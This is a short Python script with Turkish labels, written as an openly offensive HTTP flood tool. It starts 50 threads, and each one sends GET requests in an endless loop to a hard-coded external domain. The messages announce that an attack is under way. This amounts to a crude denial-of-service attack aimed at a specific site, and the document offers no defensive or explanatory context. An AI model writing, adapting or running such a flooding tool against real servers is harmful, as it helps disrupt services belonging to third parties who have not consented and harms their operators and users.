import threading
import requests
import time
TARGET_URL = "http://2dd.space/"
def saldiri():
    while True:
        try:
            response = requests.get(TARGET_URL)
            print(f"Saldırı yapılıyor! Durum Kodu: {response.status_code}")
        except Exception as e:
            print(f"Hata: {e}")

THREAD_SAYISI = 50

print(f"{THREAD_SAYISI} kişi ile saldırı başlıyor")

for i in range(THREAD_SAYISI):
    t = threading.Thread(target=saldiri)
    t.start()